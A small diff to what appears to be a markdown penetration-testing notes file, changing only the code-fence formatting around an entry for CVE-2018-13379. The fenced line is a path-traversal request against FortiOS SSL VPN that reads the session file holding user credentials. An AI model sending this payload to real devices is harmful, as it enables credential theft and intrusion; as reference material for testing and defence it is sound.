@@ -169,9 +169,9 @@ CHPWD 101 code=00a01000 msg="Begin" format="section" \[Result\] UpdatePasswd=0
 
 - [CVE-2018-13379](https://www.exploit-db.com/exploits/47288)
 
- ```bash
+```sh
 /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
- ```
+```
 
 ---
 
